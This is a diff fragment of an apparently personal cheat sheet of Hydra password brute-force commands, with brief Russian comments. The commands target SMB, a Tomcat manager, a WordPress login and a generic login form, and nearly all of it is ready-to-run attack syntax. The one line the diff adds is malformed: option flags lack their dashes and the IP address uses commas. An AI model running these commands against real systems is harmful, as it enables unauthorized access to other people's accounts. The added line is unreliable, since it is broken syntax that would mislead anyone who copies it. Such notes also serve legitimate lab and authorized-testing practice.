@@ -28,6 +28,8 @@ hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html/   (перебор ВЕБ паролей)
 
+hydra -l admin P seclist/Password/dakweb2017top100 f 10,10,10,10 http-get /monitoring
+
 hydra -vV -l elliot -P pass.txt 192.168.50.123 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'    ---(Последнее из BURPA)
 
 hydra -vV -f -l admin -P pass.txt 10.10.11.114 http-post-form -m '/login:username=^USER^&password=^PASS^:Invalid password.'
